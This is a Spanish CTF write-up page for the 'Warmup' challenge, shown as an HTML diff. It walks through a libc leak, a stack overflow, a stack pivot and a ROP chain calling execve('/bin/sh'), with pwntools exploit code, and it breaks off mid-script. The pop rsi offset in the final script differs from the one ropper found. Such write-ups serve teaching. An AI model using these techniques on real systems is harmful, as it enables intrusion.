@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Campo de Marte Warmup</title>
+
+  <meta name="description" content="Resolución del reto Warmup del CTF de Campo de Marte">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Campo de Marte Warmup">
+  <meta name="twitter:description" content="Resolución del reto Warmup del CTF de Campo de Marte">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/campodemarte.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Campo de Marte Warmup">
+  <meta property="og:description" content="Resolución del reto Warmup del CTF de Campo de Marte">
+  <meta property="og:image" content="/images/otros/campodemarte.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/campodemarte.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Campo de Marte Warmup" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Campo de Marte</h4>
+    <picture><img src="/images/otros/campodemarte.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Warmup</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el binario nos muestra una dirección en <code class="language-plaintext highlighter-rouge">x64</code> que por ahora no sabemos que es y nos muestra un prompt probablemente para enviar una posible entrada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./warmup</span><span class="p">
+0x7b8f28087bd0  
+name>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La unica función existente es la <code class="language-plaintext highlighter-rouge">main</code>, esta inicia llamando a <code class="language-plaintext highlighter-rouge">printf</code> mostrando en formato <code class="language-plaintext highlighter-rouge">%p</code> como puntero la dirección de la función <code class="language-plaintext highlighter-rouge">puts</code> cargada en memoria</p>
+<a href="/challenges/warmup/1.png" target="_blank"><div><p><img src="/challenges/warmup/1.png"></p></div></a>
+
+<p class="plain-text">Podemos comprobarlo desde <code class="language-plaintext highlighter-rouge">gdb</code>, corremos y comprobamos que la dirección mostrada es la de <code class="language-plaintext highlighter-rouge">puts</code> cargada desde libc, entonces podemos obtener un leak</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q warmup
+Reading symbols from </span><span class="ve">warmup</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">warmup</span><span class="p">)
+</span><span class="ro">pwndbg> </span><span class="p">r
+Starting program: </span><span class="ve">/home/user/warmup</span><span class="p">
+[Depuración de hilo usando libthread_db enabled]
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  
+0x7ffff7c87bd0
+name>> ^C  
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007ffff7d1ba61</span><span class="p"> in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0x7ffff7c87bd0
+   </span><span class="az">0x7ffff7c87bd0</span><span class="p"> &lt</span><span class="am">puts</span><span class="p">>:</span><span class="ve">	endbr64
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si le restamos el offset de <code class="language-plaintext highlighter-rouge">puts</code> deberiamos obtener la dirección base de <code class="language-plaintext highlighter-rouge">libc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ libcdb </span><span class="p">file libc.so.6
+[</span><span class="az">*</span><span class="p">] </span><span class="ro">libc.so.6
+    </span><span class="ve">Version:</span><span class="p">     2.39
+    </span><span class="ve">BuildID:</span><span class="p">     08134323d00289185684a4cd177d202f39c2a5f3
+    </span><span class="ve">MD5:</span><span class="p">         c0b86652995f86fa7bf131547f8105c5
+    </span><span class="ve">SHA1:</span><span class="p">        e718addc37dff7ca12d61430c9865ce13166178d
+    </span><span class="ve">SHA256:</span><span class="p">      fc4c52f3910ed57a088d19ab86c671358f5e917cd4e95b21fd08e4fd922c0aa2  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x2a1ca
+                         dup2 = 0x116960
+                       printf = 0x600f0
+                         puts = 0x87bd0
+                         read = 0x11ba50
+                   str_bin_sh = 0x1cb42f
+                       system = 0x58740
+                        write = 0x11c560</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos automatizar todo este proceso desde un exploit en <code class="language-plaintext highlighter-rouge">python</code>, recibimos la dirección y le restamos el offset para obtener <code class="language-plaintext highlighter-rouge">libc</code> base para usarla después</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./warmup"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+libc_base </span><span class="o">=</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">  
+log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit nos muestra la dirección que calculamos de <code class="language-plaintext highlighter-rouge">libc base</code> y si la comparamos con lo que nos devuelve <code class="language-plaintext highlighter-rouge">gdb</code> del proceso actual es la misma</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 313643
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './warmup']  
+[</span><span class="az">*</span><span class="p">] Libc base: 0x70c153c00000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+name>></span><span class="ro"> $</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x000070c153d1ba61 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> | </span><span class="ro">WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+          </span><span class="sa">0x404000           0x405000 rw-p     1000   5000 /home/user/warmup</span><span class="p">
+►   0x70c153c00000     0x70c153c28000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x70c153c28000     0x70c153db0000 r-xp   188000  28000 /home/user/libc.so.6</span><span class="p">
+</span><span class="p">►   0x70c153db0000     0x70c153dff000 r--p    4f000 1b0000 /home/user/libc.so.6
+</span><span class="p">►   0x70c153dff000     0x70c153e03000 r--p     4000 1fe000 /home/user/libc.so.6
+</span><span class="sa">►   0x70c153e03000     0x70c153e05000 rw-p     2000 202000 /home/user/libc.so.6
+</span><span class="p">    0x70c153e62000     0x70c153e63000 r--p     1000      0 /home/user/ld-2.39.so  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Siguiendo con el desensamblado ahora muestra con <code class="language-plaintext highlighter-rouge">printf</code> un prompt y recibe un total de <code class="language-plaintext highlighter-rouge">0x200</code> o <code class="language-plaintext highlighter-rouge">512</code> bytes en la variable global <code class="language-plaintext highlighter-rouge">name</code> utilizando la función <code class="language-plaintext highlighter-rouge">fgets</code></p>
+<a href="/challenges/warmup/2.png" target="_blank"><div><p><img src="/challenges/warmup/2.png"></p></div></a>
+
+<p class="plain-text">Podemos verificarlo enviando <code class="language-plaintext highlighter-rouge">80 A's</code>, al enviarlas a la variable name, detenemos el debugger y en la dirección <code class="language-plaintext highlighter-rouge">0x404060</code> podemos ver que contiene nuestro input</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">-q
+>>> b"A" * 80
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  
+>>></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">name>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
+alright>> ^C
+Program received signal SIGINT, Interrupt.
+</span><span class="az">0x00007ffff7d1ba61 </span><span class="p">in</span><span class="am"> read</span><span class="p"> () from </span><span class="ve">./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/s &name
+</span><span class="az">0x404060</span><span class="p"> &lt</span><span class="am">name</span><span class="p">>:	'A' &ltrepetidos 80 veces>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente llama a <code class="language-plaintext highlighter-rouge">printf</code> para mostrar otro prompt que igual recibe datos con <code class="language-plaintext highlighter-rouge">fgets</code> en la variable <code class="language-plaintext highlighter-rouge">rbp - 64</code>, recibe <code class="language-plaintext highlighter-rouge">0x58</code> o <code class="language-plaintext highlighter-rouge">88</code>, es mas de lo que soporta</p>
+<a href="/challenges/warmup/3.png" target="_blank"><div><p><img src="/challenges/warmup/3.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, este binario solo tiene activada la protección <code class="language-plaintext highlighter-rouge">NX</code> que nos impedirá ejecutar shellcode directamente en el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">warmup
+[</span><span class="az">*</span><span class="p">] '/home/user/warmup'
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ro">No PIE (0x3fe000)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">64 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">rbp</code>, <code class="language-plaintext highlighter-rouge">8 B's</code> que seran el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> b"A" * 64 + b"B" * 8 + b"C" * 8 + b"D" * 24
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'  
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos con los problemas, debido a la limitación de espacio aunque enviamos un total de <code class="language-plaintext highlighter-rouge">24 D's</code> solo vemos representadas <code class="language-plaintext highlighter-rouge">8</code>, esto es muy poco ya que es probable que necesitemos hacer <code class="language-plaintext highlighter-rouge">ROP</code> debido al <code class="language-plaintext highlighter-rouge">NX</code>, por lo que debemos hacer un stack pivot a otro lugar con mas espacio, afortunadamente el primer payload sabemos que se almacena estaticamente en la dirección <code class="language-plaintext highlighter-rouge">0x404060</code> y tenemos <code class="language-plaintext highlighter-rouge">0x200</code> de espacio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">alright>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
+okey
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x0000000000401281 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+</span><span class="az">$1</span><span class="p"> = 0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7fffffffe2d8</span><span class="p">:	0x4343434343434343
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp + 8
+</span><span class="az">0x7fffffffe2e0</span><span class="p">:	"DDDDDDD"
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, enviamos en el segundo payload el offset hasta el valor de <code class="language-plaintext highlighter-rouge">rbp</code> y en el valor de <code class="language-plaintext highlighter-rouge">rbp</code> enviamos la dirección <code class="language-plaintext highlighter-rouge">0x404060</code> de la variable <code class="language-plaintext highlighter-rouge">name</code>, luego ejecutamos un <code class="language-plaintext highlighter-rouge">leave; ret;</code> para hacer el stack pivot al <code class="language-plaintext highlighter-rouge">payload1</code> donde enviamos algunos bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn </span><span class="o">import</span><span class="p"> gdb, p64
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./warmup"</span><span class="p">,</span><span class="s"> "b *0x401281</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">  
+
+payload1</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 24</span><span class="p">
+
+payload2</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload2</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 64</span><span class="c1">                # offset</span><span class="p">
+payload2</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x404060</span><span class="p">)</span><span class="c1">            # payload1</span><span class="p">
+payload2</span><span class="o"> +=</span><span class="p"> p64(libc_base </span><span class="o">+ </span><span class="mi">0x299d2</span><span class="p">)</span><span class="c1"> # leave; ret;</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">, payload1)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">, payload2)
+
+shell.recvline()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al llegar al Breakpoint de la instrucción <code class="language-plaintext highlighter-rouge">ret</code>, <code class="language-plaintext highlighter-rouge">rbp</code> tiene como valor <code class="language-plaintext highlighter-rouge">0x404060</code>, la siguiente instrucción a ejecutarse será <code class="language-plaintext highlighter-rouge">leave; ret;</code>, la instrucción <code class="language-plaintext highlighter-rouge">leave</code> equivale a <code class="language-plaintext highlighter-rouge">mov rsp, rbp; pop rbp;</code> entonces cuando se ejecute el <code class="language-plaintext highlighter-rouge">mov</code> el <code class="language-plaintext highlighter-rouge">rsp</code> apuntará a <code class="language-plaintext highlighter-rouge">0x404060</code> y al ejecutar el <code class="language-plaintext highlighter-rouge">pop</code> quitará <code class="language-plaintext highlighter-rouge">8</code> bytes en este caso las <code class="language-plaintext highlighter-rouge">A's</code> de <code class="language-plaintext highlighter-rouge">payload1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0000000000401281 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x401281 </span><span class="p">&lt</span><span class="am">main</span><span class="p">+167>:	</span><span class="ve">ret</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rbp
+</span><span class="az">0x404060</span><span class="p"> &lt</span><span class="am">name</span><span class="p">>:	"AAAAAAAABBBBBBBB", 'C' &ltrepetidos 24 veces>  
+</span><span class="ro">pwndbg></span><span class="p"> x/2i *(long long *)($rsp)
+   </span><span class="az">0x7acdc4a299d2</span><span class="p"> &lt</span><span class="am">warn</span><span class="p">+184>:	</span><span class="ve">leave</span><span class="p">
+   </span><span class="az">0x7acdc4a299d3</span><span class="p"> &lt</span><span class="am">warn</span><span class="p">+185>:	</span><span class="ve">ret</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando ejecuta ese <code class="language-plaintext highlighter-rouge">leave; ret;</code> ahora <code class="language-plaintext highlighter-rouge">rbp</code> tomó el valor de las <code class="language-plaintext highlighter-rouge">A's</code> y la dirección de retorno son las <code class="language-plaintext highlighter-rouge">B's</code>, y afortunadamente en el stack se ven representadas todas las <code class="language-plaintext highlighter-rouge">C's</code> por lo que ahora deberiamos tener espacio suficiente para un buen ropchain</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">c
+Continuando.
+
+Program received signal SIGSEGV, Segmentation fault.  
+</span><span class="az">0x00007acdc4a299d3 </span><span class="p">in</span><span class="am"> warn</span><span class="p"> () from</span><span class="ve"> ./libc.so.6</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x7acdc4a299d3</span><span class="p"> &lt</span><span class="am">warn</span><span class="p">+185>:	</span><span class="ve">ret</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rbp
+</span><span class="az">$2</span><span class="p"> = 0x4141414141414141
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x404068</span><span class="p"> &lt</span><span class="am">name</span><span class="p">+8>:	0x4242424242424242
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp+8
+</span><span class="az">0x404070</span><span class="p"> &lt</span><span class="am">name</span><span class="p">+16>:	'C' &ltrepetidos 24 veces>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que modificamos el stack al llamar a <code class="language-plaintext highlighter-rouge">system</code> tendremos problemas, entonces haremos un <code class="language-plaintext highlighter-rouge">ropchain</code> con <code class="language-plaintext highlighter-rouge">execve</code>, para ello necesitamos almacenar en <code class="language-plaintext highlighter-rouge">rax</code> el syscall <code class="language-plaintext highlighter-rouge">0x3b</code>, en <code class="language-plaintext highlighter-rouge">rdi</code> el primer argumento que es la referencia a <code class="language-plaintext highlighter-rouge">/bin/sh</code>, finalmente en <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code> el segundo y tercer argumento que podemos establecer en <code class="language-plaintext highlighter-rouge">NULL</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file libc.so.6 --console
+</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
+</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
+</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
+</span><span class="ro">(libc.so.6/ELF/x86_64)> </span><span class="p">search pop rax; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rax; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc.so.6
+</span><span class="ro">0x00000000000dd237</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rax</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span><span class="p">
+
+</span><span class="ro">(libc.so.6/ELF/x86_64)> </span><span class="p">search pop rdi; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdi; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc.so.6
+</span><span class="ro">0x000000000010f75b</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span><span class="p">
+
+</span><span class="ro">(libc.so.6/ELF/x86_64)></span><span class="p"> search pop rsi; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rsi; ret;
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc.so.6
+</span><span class="ro">0x0000000000110a4d</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rsi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span><span class="p">
+
+</span><span class="ro">(libc.so.6/ELF/x86_64)></span><span class="p"> search pop rdx; ret;  
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdx; ret;
+
+</span><span class="ro">(libc.so.6/ELF/x86_64)></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque no encontramos un <code class="language-plaintext highlighter-rouge">pop rdx</code> encontramos un gadget perfecto que mueve a <code class="language-plaintext highlighter-rouge">rdx</code> el valor de <code class="language-plaintext highlighter-rouge">rsi</code> que establecimos a <code class="language-plaintext highlighter-rouge">0</code>, luego ejecuta un <code class="language-plaintext highlighter-rouge">xor esi, esi</code> y al final un <code class="language-plaintext highlighter-rouge">syscall</code> que es lo que queremos para llamar a <code class="language-plaintext highlighter-rouge">execve("/bin/sh", NULL, NULL)</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">(libc.so.6/ELF/x86_64)></span><span class="p"> search mov rdx, rsi; %; syscall
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov rdx, rsi; %; syscall
+
+</span><span class="ve">[INFO]</span><span class="p"> File: libc.so.6
+</span><span class="ro">0x000000000011b71f</span><span class="p">:</span><span class="am"> mov</span><span class="p"> rdx, rsi</span><span class="az">;</span><span class="am"> xor</span><span class="p"> esi, esi</span><span class="az">;</span><span class="am"> syscall</span><span class="az">;</span><span class="p">  
+
+</span><span class="ro">(libc.so.6/ELF/x86_64)></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit final en <code class="language-plaintext highlighter-rouge">payload2</code> rellena con <code class="language-plaintext highlighter-rouge">A's</code> el offset y luego ejecuta un stack pivot hacia el <code class="language-plaintext highlighter-rouge">payload1</code> donde ejecuta nuestro ropchain que nos devuelve una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p64
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./warmup"</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x87bd0</span><span class="p">
+
+payload1</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="c1">                  # padding for leave</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x0dd237</span><span class="p">)</span><span class="c1"> # pop rax; ret;</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x3b</span><span class="p">)</span><span class="c1">                 # execve()</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x10f75b</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x1cb42f</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x110b7c</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                  # NULL</span><span class="p">
+payload1</span><span class="o"> +=</span><span class="p"> p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x11b71f</span><span class="p">)</span><span class="c1"> # mov rdx, rsi; syscall;</span><span class="p">  
+
+payload2</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload2</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 64</span><span class="c1">                 # offset</span><span class="p">
+payload2</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x404060</span><span class="p">)</span><span class="c1">             # payload1</span><span class="p">
